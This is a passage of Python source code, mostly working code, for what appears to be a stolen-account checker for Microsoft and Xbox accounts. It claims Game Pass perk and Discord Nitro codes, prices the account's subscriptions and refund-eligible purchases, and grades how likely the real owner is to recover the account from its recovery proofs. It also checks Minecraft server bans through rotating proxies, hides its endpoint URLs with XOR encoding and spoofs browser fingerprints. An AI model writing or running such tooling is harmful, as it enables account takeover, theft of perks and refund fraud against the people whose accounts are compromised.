                        or "discordapp.com/settings" in low_link
                        or "support.xbox.com" in low_link):
                    return None

                is_link    = link.startswith(("".join(chr(c^24)for c in[112, 108, 108, 104, 34, 55, 55]))) or link.startswith(("".join(chr(c^81)for c in[57, 37, 37, 33, 34, 107, 126, 126])))
                is_discord = bool(_DISCORD_RE.match(link))
                days_left  = "Unknown"

                if is_discord:
                    code_id = _DISCORD_RE.search(link).group(1)
                    try:
                        dr = await clone.get(
                            f"https://discord.com/api/v9/entitlements/gift-codes/{code_id}"
                            "?with_application=false&with_subscription_plan=true",
                            timeout=10,
                        )
                        if dr.status_code == 200:
                            dj = dr.json()
                            if dj.get("redeemed") or dj.get("uses", 0) >= dj.get("max_uses", 1):
                                days_left = "Claimed"
                            else:
                                exp = dj.get("expires_at")
                                if exp:
                                    try:
                                        dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
                                        days_left = max(0, (dt - datetime.now(timezone.utc)).days)
                                    except Exception:
                                        pass
                    except Exception:
                        pass
                    if days_left == "Claimed":
                        return None

                ptype = (
                    "Discord Nitro" if is_discord
                    else ("Promo Link" if is_link else "Xbox Perk Code")
                )
                return {
                    "code":      link,
                    "type":      ptype,
                    "title":     offer_title_map.get(oid, "Xbox Game Pass Perk"),
                    "region":    "US",
                    "days_left": days_left,
                    "is_link":   is_link,
                }
            except Exception:
                return None

        claim_results = await asyncio.gather(
            *(_claim_offer(o) for o in offers), return_exceptions=True
        )
        for pr in claim_results:
            if not isinstance(pr, dict):
                continue
            link = pr["code"]
            if link in seen:
                continue
            seen.add(link)
            perks.append(pr)
    except Exception as e:
        await log_error("Promos", e)
    finally:
        if clone:
            await _close_sess(clone)
    return perks

# --- fetch_games ---
async def fetch_games(sess: AsyncSession, xbox_token: str) -> list[str]:
    if not xbox_token:
        return []

    json_h = {"Accept": "application/json", "Content-Type": "application/json"}
    try:
        await rl_xbox.acquire()
        xr = await sess.post(
            ("".join(chr(c^226)for c in[138, 150, 150, 146, 145, 216, 205, 205, 154, 145, 150, 145, 204, 131, 151, 150, 138, 204, 154, 128, 141, 154, 142, 139, 148, 135, 204, 129, 141, 143, 205, 154, 145, 150, 145, 205, 131, 151, 150, 138, 141, 144, 139, 152, 135])),
            json={
                "Properties":   {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": ("".join(chr(c^139)for c in[227, 255, 255, 251, 177, 164, 164, 243, 233, 228, 243, 231, 226, 253, 238, 165, 232, 228, 230])),
                "TokenType":    "JWT",
            },
            headers=json_h, timeout=12,
        )
        if xr.status_code != 200:
            return []
        xj  = xr.json()
        tok = xj.get("Token", "")
        xui = xj.get("DisplayClaims", {}).get("xui", [{}])
        uhs  = xui[0].get("uhs", "") if xui else ""
        xuid = xui[0].get("xid", "") if xui else ""
        if not tok or not uhs or not xuid:
            return []

        xbl_h = {
            "Authorization":          f"XBL3.0 x={uhs};{tok}",
            "Accept":                 "application/json",
            "Accept-Language":        "en-US",
            "x-xbl-contract-version": "2",
            "User-Agent":             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        tr = await sess.get(
            f"https://titlehub.xboxlive.com/users/xuid({xuid})"
            "/titles/titleHistory/decoration/detail",
            headers=xbl_h, timeout=15,
        )
        if tr.status_code != 200:
            return []
        try:
            data = tr.json()
        except Exception:
            return []
        titles = data.get("titles", []) if isinstance(data, dict) else []
        names: list[str] = []
        for t in titles:
            if not isinstance(t, dict):
                continue
            if (t.get("type") or "") != "Game":
                continue
            name = (t.get("name") or "").strip()
            if name:
                names.append(name)
        return sorted(set(names))
    except Exception as e:
        await log_error("Games", e)
        return []

USD_RATES: dict[str, float] = {

    "USD": 1.0,     "EUR": 1.09,    "GBP": 1.28,    "CAD": 0.73,    "AUD": 0.65,
    "NZD": 0.59,    "CHF": 1.13,    "JPY": 0.0065,  "CNY": 0.14,    "HKD": 0.13,
    "SGD": 0.74,    "TWD": 0.031,

    "BRL": 0.18,    "MXN": 0.054,   "ARS": 0.001,   "CLP": 0.001,   "COP": 0.00023,
    "PEN": 0.27,    "UYU": 0.024,

    "SEK": 0.093,   "NOK": 0.093,   "DKK": 0.147,   "PLN": 0.25,    "CZK": 0.043,
    "HUF": 0.0027,  "RON": 0.22,    "BGN": 0.56,    "UAH": 0.024,   "RUB": 0.011,
    "TRY": 0.03,    "ILS": 0.27,    "SAR": 0.27,    "AED": 0.27,    "EGP": 0.021,
    "ZAR": 0.055,   "NGN": 0.00067, "KES": 0.0077,

    "INR": 0.012,   "KRW": 0.00072, "IDR": 0.000064,"MYR": 0.22,    "PHP": 0.017,
    "THB": 0.028,   "VND": 0.000041,"KZT": 0.002,   "PKR": 0.0036,
}

_SUB_MONTHLY_USD: list[tuple[tuple[str, ...], float]] = [

    (("xbox game pass ultimate", "gp ultimate", "xgpu"),               16.99),
    (("pc game pass", "game pass pc", "xgp pc"),                       11.99),
    (("xbox game pass core", "xbox live gold", "live gold"),            9.99),
    (("xbox game pass",),                                              11.99),
    (("microsoft 365 family", "office 365 family", "m365 family"),     12.99),
    (("microsoft 365 personal", "office 365 personal", "m365 personal"), 9.99),
    (("microsoft 365 basic", "m365 basic"),                             1.99),
    (("onedrive 100gb", "onedrive standalone"),                          1.99),
    (("skype credit",),                                                10.00),
    (("copilot pro",),                                                 20.00),
    (("minecraft realms plus",),                                        7.99),
    (("minecraft realms",),                                             3.99),
    (("ea play pro",),                                                 16.99),
    (("ea play",),                                                      4.99),
]

# --- _estimate_sub_value ---
def _estimate_sub_value(name: str, days_left: int | None) -> float | None:
    if not name or days_left is None or days_left <= 0:
        return None
    lower = name.lower()
    for keywords, monthly in _SUB_MONTHLY_USD:
        if any(k in lower for k in keywords):
            return round(monthly * days_left / 30.0, 2)
    return None

# --- class RefundInfo ---
@dataclass
class RefundInfo:
    count:     int        = 0
    total_usd: float      = 0.0
    items:     list[str]  = field(default_factory=list)

# --- fetch_services_data ---
async def fetch_services_data(sess: AsyncSession, lang: str) -> tuple[RefundInfo, str]:
    UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    base_h = {
        "User-Agent":      UA,
        "Accept-Language":  lang,
        "Referer":         ("".join(chr(c^40)for c in[64, 92, 92, 88, 91, 18, 7, 7, 73, 75, 75, 71, 93, 70, 92, 6, 69, 65, 75, 90, 71, 91, 71, 78, 92, 6, 75, 71, 69, 7])),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    ref_res = RefundInfo()
    subs_str = "None"
    clone  = None
    try:
        clone = await clone_session(sess)

        url    = ("".join(chr(c^75)for c in[35, 63, 63, 59, 56, 113, 100, 100, 42, 40, 40, 36, 62, 37, 63, 101, 38, 34, 40, 57, 36, 56, 36, 45, 63, 101, 40, 36, 38, 100, 56, 46, 57, 61, 34, 40, 46, 56]))
        method = "GET"
        data   = None
        hdrs   = base_h
        cur_html = ""

        for _ in range(12):
            try:
                if method == "POST":
                    r = await clone.post(url, data=data, headers=hdrs, allow_redirects=False, timeout=15)
                else:
                    r = await clone.get(url, headers=hdrs, allow_redirects=False, timeout=15)
            except Exception:
                break
            cur_html = r.text
            cur_url  = str(r.url)
            loc      = r.headers.get("Location", "")

            if "account.microsoft.com/services" in cur_url and "auth" not in cur_url and r.status_code == 200:
                break

            if r.status_code in (301, 302, 303, 307, 308) and loc:
                url = loc if loc.startswith("http") else urljoin(cur_url, loc)
                if r.status_code in (301, 302, 303):
                    method = "GET"
                    data   = None
                    hdrs   = base_h
                continue

            js_m = re.search(
                r'(?:window\.)?location(?:\.replace|\s*=)\s*\(?["\']'
                r'(https://(?:account\.microsoft\.com|login\.live\.com|login\.microsoftonline\.com)/[^"\'>]+)["\']',
                cur_html,
            )
            if js_m:
                url    = js_m.group(1).replace("&amp;", "&")
                method = "GET"
                data   = None
                hdrs   = base_h
                continue

            inputs = _parse_inputs(cur_html)
            act_m  = re.search(r'action="([^"]+)"', cur_html, re.I) if inputs else None
            if inputs and act_m:
                post_url = act_m.group(1).replace("&amp;", "&")
                if not post_url.startswith("http"):
                    post_url = urljoin(cur_url, post_url)
                url    = post_url
                method = "POST"
                data   = inputs
                hdrs   = {**base_h,
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Referer": cur_url}
                continue

            meta_m = re.search(
                r'content=["\'][^;]*;\s*(?:url=|URL=)([^"\'>\s]+)',
                cur_html, re.I,
            )
            if meta_m:
                nxt = meta_m.group(1).strip().rstrip("'\"").replace("&amp;", "&")
                if not nxt.startswith("http"):
                    nxt = urljoin(cur_url, nxt)
                url    = nxt
                method = "GET"
                data   = None
                hdrs   = base_h
                continue
            break

        vt_m = (
            re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', cur_html)
            or re.search(r'value="([^"]+)"[^>]*name="__RequestVerificationToken"', cur_html)
        )
        api_h: dict = {
            "Accept":           "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent":       UA,
            "Referer":          ("".join(chr(c^92)for c in[52, 40, 40, 44, 47, 102, 115, 115, 61, 63, 63, 51, 41, 50, 40, 114, 49, 53, 63, 46, 51, 47, 51, 58, 40, 114, 63, 51, 49, 115, 47, 57, 46, 42, 53, 63, 57, 47])),
        }
        if vt_m:
            api_h["__RequestVerificationToken"] = vt_m.group(1)

        subs_r, or_r = await asyncio.gather(
            clone.get(("".join(chr(c^141)for c in[229, 249, 249, 253, 254, 183, 162, 162, 236, 238, 238, 226, 248, 227, 249, 163, 224, 228, 238, 255, 226, 254, 226, 235, 249, 163, 238, 226, 224, 162, 254, 232, 255, 251, 228, 238, 232, 254, 162, 236, 253, 228, 162, 254, 248, 239, 254, 238, 255, 228, 253, 249, 228, 226, 227, 254])), headers=api_h, timeout=15),
            clone.get(
                ("".join(chr(c^65)for c in[41, 53, 53, 49, 50, 123, 110, 110, 32, 34, 34, 46, 52, 47, 53, 111, 44, 40, 34, 51, 46, 50, 46, 39, 53, 111, 34, 46, 44, 110, 32, 49, 40, 110, 46, 51, 37, 36, 51, 108, 41, 40, 50, 53, 46, 51, 56, 110, 55, 112, 110, 46, 51, 37, 36, 51, 50])),
                params={
                    "period":              "AllTime",
                    "orderTypeFilter":     "All",
                    "filterChangeCount":   "0",
                    "isInD365Orders":      True,
                    "isPiDetailsRequired": True,
                    "timeZoneOffsetMinutes": "0",
                },
                headers=api_h, timeout=16,
            ),
            return_exceptions=True,
        )

        if isinstance(subs_r, Exception) or getattr(subs_r, "status_code", 0) != 200:
            try:
                subs_r = await clone.get(
                    ("".join(chr(c^33)for c in[73, 85, 85, 81, 82, 27, 14, 14, 64, 66, 66, 78, 84, 79, 85, 15, 76, 72, 66, 83, 78, 82, 78, 71, 85, 15, 66, 78, 76, 14, 64, 81, 72, 14, 82, 84, 67, 82, 66, 83, 72, 81, 85, 72, 78, 79, 82, 14, 87, 16, 14, 84, 82, 68, 83, 14, 82, 68, 83, 87, 72, 66, 68, 82])),
                    headers=api_h, timeout=15
                )
            except Exception:
                subs_r = None

        if subs_r is not None and not isinstance(subs_r, Exception) and getattr(subs_r, "status_code", 0) == 200:
            try:
                data = subs_r.json()
                active = []
                if isinstance(data, dict):
                    for sub in data.get("active", []) or []:
                        if not isinstance(sub, dict):
                            continue

                        pretty = None
                        prod = sub.get("productRenewal")
                        if isinstance(prod, dict):
                            pretty = prod.get("name") or prod.get("displayName")
                        if not pretty:
                            pn = sub.get("payNow")
                            if isinstance(pn, dict):
                                items_list = pn.get("items")
                                if isinstance(items_list, list) and items_list:
                                    pretty = items_list[0].get("name")

                        raw_name = str(
                            pretty
                            or sub.get("displayTitle") or sub.get("title")
                            or sub.get("name")
                            or sub.get("modelId") or sub.get("brandId")
                            or sub.get("skuType") or "Unknown"
                        ).strip()

                        if raw_name.isupper() or "_" in raw_name or "-" in raw_name:
                            cleaned = raw_name.replace("_", " ").replace("-", " ")
                            words = re.findall(r'[A-Z]?[a-z]+|[A-Z]+(?=[A-Z][a-z]|\b)|\d+', cleaned)
                            name  = " ".join(w.capitalize() for w in words) if words else cleaned
                        else:
                            name = raw_name

                        is_lifetime = bool(sub.get("isPerpetual"))

                        start = "Unknown"
                        prod = sub.get("productRenewal")
                        if isinstance(prod, dict) and prod.get("startDateShortString"):
                            start = prod.get("startDateShortString")
                        else:
                            nc = sub.get("nextCharge")
                            if isinstance(nc, dict) and nc.get("chargeDateShortString"):
                                start = nc.get("chargeDateShortString")
                        if start == "Unknown":
                            end = sub.get("expirationDate") or sub.get("subscriptionEndDate")
                            if end:
                                try:
                                    start = str(end).split("T")[0].split()[0]
                                except Exception:
                                    pass

                        st = str(sub.get("status") or sub.get("state") or "").lower()
                        if start == "Unknown" and st in ("active", "enabled"):
                            start = "Lifetime" if is_lifetime else "Active"

                        auto_renew = bool(
                            sub.get("autoRenew")
                            or sub.get("isAutoRenew")
                            or sub.get("willAutoRenew")
                        )
                        date_label = "Renews" if auto_renew else "Expires"

                        end_dt: datetime | None = None
                        for iso_key in ("expirationDate", "subscriptionEndDate",
                                          "nextChargeDateUtc", "nextRenewalDate",
                                          "paidUntilDate"):
                            iso_v = sub.get(iso_key)
                            if iso_v:
                                try:
                                    end_dt = datetime.fromisoformat(str(iso_v).replace("Z", "+00:00"))
                                    break
                                except Exception:
                                    pass
                        if end_dt is None:
                            prod2 = sub.get("productRenewal")
                            if isinstance(prod2, dict):
                                iso_v = prod2.get("startDate") or prod2.get("chargeDate")
                                if iso_v:
                                    try:
                                        end_dt = datetime.fromisoformat(str(iso_v).replace("Z", "+00:00"))
                                    except Exception:
                                        pass

                        days_left: int | None = None
                        if end_dt is not None:
                            days_left = max(0, (end_dt - datetime.now(timezone.utc)).days)

                        est_value = _estimate_sub_value(name, days_left)

                        extras: list[str] = []
                        if days_left is not None:
                            extras.append(f"Days: {days_left}")
                        if est_value is not None:
                            extras.append(f"Est: ${est_value:.2f}")
                        extra_str = f" | {' | '.join(extras)}" if extras else ""

                        if is_lifetime or start == "Lifetime":
                            active.append(f"{name} (Lifetime License)")
                        elif start not in ("Unknown", "Active"):
                            active.append(f"{name} ({date_label}: {start}{extra_str})")
                        else:
                            active.append(f"{name} (Active{extra_str})")
                if active:
                    subs_str = ", ".join(active)
            except Exception:
                pass

        if or_r is not None and not isinstance(or_r, Exception) and getattr(or_r, "status_code", 0) == 200:
            now_utc = datetime.now(timezone.utc)
            try:
                or_data = or_r.json()
            except Exception:
                or_data = {}
            orders = or_data.get("orders", []) if isinstance(or_data, dict) else []
            for order in orders:
                if not isinstance(order, dict):
                    continue
                curr   = (order.get("currencyCode") or "USD").upper()
                date_s = order.get("orderDate") or order.get("purchasedDate") or ""
                days_left_str = ""
                if date_s:
                    try:
                        dt        = datetime.fromisoformat(date_s.replace("Z", "+00:00"))
                        remaining = max(0, 14 - (now_utc - dt).days)
                        days_left_str = f"{remaining}d left"
                    except Exception:
                        pass
                order_items = (
                    order.get("lineItems")
                    or order.get("orderLineItems")
                    or order.get("items")
                    or []
                )
                for item in order_items:
                    if not isinstance(item, dict):
                        continue

                    if not (
                        item.get("isRefundEligible")
                        or item.get("refundEligible")
                        or item.get("refundable")
                        or (isinstance(item.get("refundPolicy"), dict)
                            and item["refundPolicy"].get("isRefundable"))
                    ):
                        continue
                    title = (
                        item.get("localTitle")
                        or item.get("productTitle")
                        or item.get("title")
                        or item.get("displayName")
                        or "Microsoft Item"
                    )
                    price = 0.0
                    for pf in ("totalPrice", "unitPrice", "listPrice",
                               "price", "amount", "netPrice"):
                        pv = item.get(pf)
                        if pv is not None:
                            try:
                                price = float(pv)
                                if price > 0:
                                    break
                            except Exception:
                                pass
                    if price <= 0:
                        try:
                            price = float(order.get("orderTotal") or 0)
                        except Exception:
                            price = 0.0

                    rate = USD_RATES.get(curr)
                    if rate is not None:
                        ref_res.total_usd += price * rate
                    ref_res.count     += 1
                    sym   = CURRENCY_SYMBOLS.get(curr, f"{curr} ")
                    entry = f"{title} ({sym}{price:.2f} {curr})"
                    if days_left_str:
                        entry += f" — {days_left_str}"
                    date_clean = date_s[:10] if len(date_s) >= 10 else ""
                    if date_clean:
                        entry += f" [Purchased: {date_clean}]"
                    ref_res.items.append(entry)
    except Exception as e:
        await log_error("Refundable", e)
    finally:
        if clone:
            await _close_sess(clone)
    return ref_res, subs_str

_AML_PROOF_TYPES: dict[int, str] = {
    1: "Email", 2: "AltEmail", 3: "SMS", 4: "DeviceId", 5: "CSS", 6: "SQSA",
    8: "HIP", 9: "Birthday", 10: "TOTPAuth", 11: "RecoveryCode",
    13: "StrongTicket", 14: "TOTPAuthV2", 15: "U2F", 18: "Passkey", -3: "Voice",
}

_AML_STRONG_2FA = frozenset({10, 14, 15, 18})

# --- class AMLInfo ---
@dataclass
class AMLInfo:
    verdict:        str       = "Unknown"
    active_proofs:  int       = 0
    proof_types:    list[str] = field(default_factory=list)
    recovery_email: str       = "None"
    recovery_phone: str       = "None"
    has_2fa:        bool      = False
    tfa_method:     str       = ""

# --- fetch_aml_status ---
async def fetch_aml_status(sess: AsyncSession, lang: str) -> AMLInfo:
    if not config.modules.get("aml", True):
        return AMLInfo()
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
    base_h = {
        "User-Agent":      UA,
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": lang,
        "Sec-CH-UA":       '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile":   "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Site":  "none",
        "Sec-Fetch-Mode":  "navigate",
        "Sec-Fetch-Dest":  "document",
        "Sec-Fetch-User":  "?1",
        "Upgrade-Insecure-Requests": "1",
        "Referer":         ("".join(chr(c^59)for c in[83, 79, 79, 75, 72, 1, 20, 20, 90, 88, 88, 84, 78, 85, 79, 21, 87, 82, 77, 94, 21, 88, 84, 86, 20])),
    }
    result = AMLInfo()
    clone  = None
    try:
        clone = await clone_session(sess)

        url    = ("".join(chr(c^126)for c in[22, 10, 10, 14, 13, 68, 81, 81, 31, 29, 29, 17, 11, 16, 10, 80, 18, 23, 8, 27, 80, 29, 17, 19, 81, 13, 11, 19, 19, 31, 12, 7, 14, 31, 25, 27, 80, 31, 13, 14, 6]))
        method = "GET"
        data   = None
        hdrs   = base_h

        for _ in range(12):
            try:
                if method == "POST":
                    r = await clone.post(url, data=data, headers=hdrs,
                                          allow_redirects=False, timeout=15)
                else:
                    r = await clone.get(url, headers=hdrs,
                                         allow_redirects=False, timeout=15)
            except Exception:
                break
            cur_url  = str(r.url)
            cur_html = r.text
            loc      = r.headers.get("Location", "")

            if (r.status_code == 200
                and "account.live.com" in cur_url
                and "auth" not in cur_url.lower()
                and not any(bad in cur_url.lower() for bad in (
                    "ar/cancel", "reportcompromise", "/compromise",
                    "error.aspx", "consent/update", "password/reset", "abuse",
                ))):
                break

            low_url = cur_url.lower()
            if any(bad in low_url for bad in (
                "reportcompromise", "/compromise", "error.aspx",
                "consent/update", "password/reset", "abuse",
                "ar/cancel",
            )):
                break

            if r.status_code in (301, 302, 303, 307, 308) and loc:
                url = loc if loc.startswith("http") else urljoin(cur_url, loc)
                if r.status_code in (301, 302, 303):
                    method = "GET"; data = None
                    hdrs   = {**base_h, "Referer": cur_url}
                continue

            js_m = re.search(
                r'(?:window\.)?location(?:\.replace|\s*=)\s*\(?["\']'
                r'(https://(?:account\.(?:live|microsoft)\.com|login\.(?:live|microsoftonline)\.com)/[^"\'>]+)["\']',
                cur_html,
            )
            if js_m:
                url    = js_m.group(1).replace("&amp;", "&")
                method = "GET"; data = None
                hdrs   = {**base_h, "Referer": cur_url}
                continue

            fmhf_m = re.search(
                r'<form[^>]*(?:id|name)="fmHF"[^>]*action="([^"]+)"',
                cur_html, re.I,
            )
            if fmhf_m:
                post_url = fmhf_m.group(1).replace("&amp;", "&")
                if not post_url.startswith("http"):
                    post_url = urljoin(cur_url, post_url)

                low_post = post_url.lower()
                if any(bad in low_post for bad in (
                    "reportcompromise", "compromise", "password/reset",
                    "consent/update", "abuse", "kmsi",
                )):
                    break
                url    = post_url
                method = "POST"
                data   = _parse_inputs(cur_html)
                hdrs   = {**base_h,
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Referer": cur_url}
                continue

            meta_m = re.search(
                r'content=["\'][^;]*;\s*(?:url=|URL=)([^"\'>\s]+)',
                cur_html, re.I,
            )
            if meta_m:
                nxt = meta_m.group(1).strip().rstrip("'\"").replace("&amp;", "&")
                if not nxt.startswith("http"):
                    nxt = urljoin(cur_url, nxt)
                url    = nxt
                method = "GET"; data = None
                hdrs   = {**base_h, "Referer": cur_url}
                continue

            break

        proofs = None
        for attempt in range(2):
            r = await clone.get(
                ("".join(chr(c^18)for c in[122, 102, 102, 98, 97, 40, 61, 61, 115, 113, 113, 125, 103, 124, 102, 60, 126, 123, 100, 119, 60, 113, 125, 127, 61, 98, 96, 125, 125, 116, 97, 61, 127, 115, 124, 115, 117, 119, 61, 115, 118, 118, 123, 102, 123, 125, 124, 115, 126])),
                headers=base_h, timeout=15,
            )
            if r.status_code != 200:
                if attempt == 0:
                    await asyncio.sleep(0.4 + random.uniform(0.0, 0.3))
                continue
            html = r.text
            m = re.search(r'"arrUserProofs"\s*:\s*(\[.*?\])(?:,|\})', html, re.S)
            if m:
                try:
                    proofs = json.loads(m.group(1))
                    break
                except Exception:
                    pass
            if attempt == 0:
                await asyncio.sleep(0.4 + random.uniform(0.0, 0.3))

        if not isinstance(proofs, list):
            return result

        active = [p for p in proofs if isinstance(p, dict) and not p.get("isLost")]
        result.active_proofs = len(active)
        types_active = [p.get("type") for p in active]
        result.proof_types = [_AML_PROOF_TYPES.get(t, f"Type{t}") for t in types_active]

        for p in active:
            t = p.get("type")
            display = str(p.get("display", "") or "").strip()
            if t in (1, 2) and result.recovery_email == "None" and display:
                result.recovery_email = display
            elif t in (3, -3) and result.recovery_phone == "None" and display:
                result.recovery_phone = display
            if t in _AML_STRONG_2FA and not result.has_2fa:
                result.has_2fa = True
                result.tfa_method = _AML_PROOF_TYPES.get(t, f"Type{t}")

        has_phone = 3 in types_active or -3 in types_active
        has_email = 1 in types_active or 2 in types_active
        if not active:
            result.verdict = "HIGH"
        elif result.has_2fa:
            result.verdict = "LOW"
        elif has_phone:
            result.verdict = "LOW"
        elif has_email:
            result.verdict = "MEDIUM"
        else:
            result.verdict = "MEDIUM"
    except Exception as e:
        await log_error("AML", e)
    finally:
        if clone:
            await _close_sess(clone)
    return result

# --- _pack_varint ---
def _pack_varint(v: int) -> bytes:
    out = b""
    while True:
        b  = v & 0x7F
        v >>= 7
        out += bytes([b | 0x80]) if v else bytes([b])
        if not v:
            break
    return out

# --- _pack_string ---
def _pack_string(s: str) -> bytes:
    enc = s.encode("utf-8")
    return _pack_varint(len(enc)) + enc

# --- _pack_port ---
def _pack_port(p: int) -> bytes:
    return struct.pack(">H", p)

# --- class _AES_CFB8 ---
class _AES_CFB8:
    def __init__(self, key: bytes) -> None:
        c        = Cipher(algorithms.AES(key), modes.CFB8(key), backend=default_backend())
        self.enc = c.encryptor()
        self.dec = c.decryptor()
    def encrypt(self, data: bytes) -> bytes: return self.enc.update(data)
    def decrypt(self, data: bytes) -> bytes: return self.dec.update(data)

# --- _rsa_encrypt ---
def _rsa_encrypt(pub_der: bytes, data: bytes) -> bytes:
    pub = serialization.load_der_public_key(pub_der, backend=default_backend())
    return pub.encrypt(data, rsa_padding.PKCS1v15())

_BAN_HOST_SEMAPHORES: dict[str, asyncio.Semaphore] = {}
_BAN_HOST_LOCK: asyncio.Lock | None = None

# --- _ban_sem_for ---
def _ban_sem_for(host: str) -> asyncio.Semaphore:
    sem = _BAN_HOST_SEMAPHORES.get(host)
    if sem is None:
        sem = asyncio.Semaphore(3)
        _BAN_HOST_SEMAPHORES[host] = sem
    return sem

_MC_SRV_CACHE: dict[str, tuple[str, int] | None] = {}
_MC_SRV_LOCK: asyncio.Lock | None = None

# --- _resolve_mc_srv ---
async def _resolve_mc_srv(host: str, default_port: int) -> tuple[str, int]:
    if host in _MC_SRV_CACHE:
        cached = _MC_SRV_CACHE[host]
        return cached if cached else (host, default_port)

    global _MC_SRV_LOCK
    if _MC_SRV_LOCK is None:
        _MC_SRV_LOCK = asyncio.Lock()

    async with _MC_SRV_LOCK:

        if host in _MC_SRV_CACHE:
            cached = _MC_SRV_CACHE[host]
            return cached if cached else (host, default_port)

        query = f"_minecraft._tcp.{host}"
        endpoints = (
            f"https://cloudflare-dns.com/dns-query?name={query}&type=SRV",
            f"https://dns.google/resolve?name={query}&type=SRV",
        )
        result: tuple[str, int] | None = None
        for url in endpoints:
            try:
                async with AsyncSession(
                    impersonate=random.choice(TARGETS), timeout=4, verify=False,
                ) as s:
                    r = await s.get(url, headers={"Accept": "application/dns-json"})
                    if r.status_code != 200:
                        continue
                    try:
                        data = r.json()
                    except Exception:
                        continue
                    answers = data.get("Answer", []) if isinstance(data, dict) else []

                    parsed: list[tuple[int, int, str, int]] = []
                    for a in answers:
                        if a.get("type") != 33:
                            continue
                        parts = str(a.get("data", "")).strip().split()
                        if len(parts) < 4:
                            continue
                        try:
                            prio   = int(parts[0])
                            weight = int(parts[1])
                            port   = int(parts[2])
                            target = parts[3].rstrip(".")
                            parsed.append((prio, -weight, target, port))
                        except (ValueError, IndexError):
                            continue
                    if parsed:
                        parsed.sort()
                        _, _, target, port = parsed[0]
                        result = (target, port)
                        break

                    break
            except Exception:
                continue

        _MC_SRV_CACHE[host] = result
        return result if result else (host, default_port)

# --- class ServerBanChecker ---
class ServerBanChecker:
    def __init__(
        self,
        host:      str,
        port:      int,
        protocol:  int,
        name:      str,
        uuid_str:  str,
        mc_token:  str,
        proxy:     str | None = None,
    ) -> None:
        self.host     = host
        self.port     = port
        self.protocol = protocol
        self.name     = name
        self.uuid_str = uuid_str
        self.mc_token = mc_token
        self.proxy    = proxy
        self._aes: _AES_CFB8 | None = None
        self._threshold = -1

    async def _read_raw_byte(self, reader) -> bytes:
        raw = await reader.readexactly(1)
        return self._aes.decrypt(raw) if self._aes else raw

    async def _read_varint(self, reader) -> int:
        r = 0
        for i in range(5):
            b = (await self._read_raw_byte(reader))[0]
            r |= (b & 0x7F) << (7 * i)
            if not (b & 0x80):
                break
        return r

    async def _read_packet(self, reader) -> tuple[int, bytes]:
        length = await self._read_varint(reader)
        data   = await reader.readexactly(length)
        if self._aes:
            data = self._aes.decrypt(data)

        if self._threshold >= 0:
            data_len, rest = self._read_varint_buf(data)
            if data_len > 0:
                import zlib
                data = zlib.decompress(rest)
            else:
                data = rest

        pid, off = 0, 0
        for i in range(5):
            b = data[off]; off += 1
            pid |= (b & 0x7F) << (7 * i)
            if not (b & 0x80):
                break
        return pid, data[off:]

    def _write_packet(self, writer, pid: int, payload: bytes) -> None:
        pid_b = _pack_varint(pid)
        uncompressed = pid_b + payload

        if self._threshold >= 0:
            if len(uncompressed) >= self._threshold:
                import zlib
                compressed = zlib.compress(uncompressed)
                data_len_b = _pack_varint(len(uncompressed))
                pkt = _pack_varint(len(data_len_b) + len(compressed)) + data_len_b + compressed
            else:
                data_len_b = _pack_varint(0)
                pkt = _pack_varint(len(data_len_b) + len(uncompressed)) + data_len_b + uncompressed
        else:
            pkt = _pack_varint(len(uncompressed)) + uncompressed

        if self._aes:
            pkt = self._aes.encrypt(pkt)
        writer.write(pkt)

    @staticmethod
    def _read_varint_buf(buf: bytes) -> tuple[int, bytes]:
        r, off = 0, 0
        for i in range(5):
            b = buf[off]; off += 1
            r |= (b & 0x7F) << (7 * i)
            if not (b & 0x80):
                break
        return r, buf[off:]

    @staticmethod
    def _read_string_buf(buf: bytes) -> tuple[str, bytes]:
        length, buf = ServerBanChecker._read_varint_buf(buf)
        return buf[:length].decode("utf-8"), buf[length:]

    _region_blocked_hosts: set[str] = set()

    async def check(self) -> str:

        # Module gate: Hypixel subclass -> "hypixel", plain server -> "donut"
        _mod = "hypixel" if isinstance(self, HypixelBanChecker) else "donut"
        if not config.modules.get(_mod, True):
            return "N/A"

        if not self.proxy and self.host in ServerBanChecker._region_blocked_hosts:
            result = "Unknown (Rate Limited)"
        else:
            result = await self._check_once()

        if (result in ("Unknown (Rate Limited)", "Unknown (IP Blocked)")
                and not self.proxy):
            ServerBanChecker._region_blocked_hosts.add(self.host)
            if proxies:
                for candidate in random.sample(proxies, min(3, len(proxies))):
                    self.proxy = candidate
                    result = await self._check_once()
                    if result not in ("Unknown (Rate Limited)", "Unknown (IP Blocked)",
                                        "Error (Timeout)", "Error (Connection Refused)",
                                        "Unknown (No TCP proxy)"):
                        break

                self.proxy = None
        return result

    async def _check_once(self) -> str:
        if self.proxy and not self.proxy.startswith((("".join(chr(c^198)for c in[174, 178, 178, 182, 252, 233, 233])), ("".join(chr(c^94)for c in[54, 42, 42, 46, 45, 100, 113, 113])), "socks5://", "socks5h://", "socks4://", "socks4a://")):
            return "Unknown (No TCP proxy)"

        sem = _ban_sem_for(self.host)

        connect_host, connect_port = await _resolve_mc_srv(self.host, self.port)

        saw_reset = False

        for attempt in range(3):
            self._aes = None
            self._threshold = -1
            writer    = None
            held_sem  = False
            try:
                await sem.acquire()
                held_sem = True
                if self.proxy:
                    import base64
                    p = urlparse(self.proxy)
                    p_host = p.hostname
                    p_port = p.port or 1080

                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(p_host, p_port),
                        timeout=9,
                    )

                    proto = p.scheme.lower() if p.scheme else "http"
                    if "socks5" in proto:

                        writer.write(b"\x05\x02\x00\x02")
                        await writer.drain()

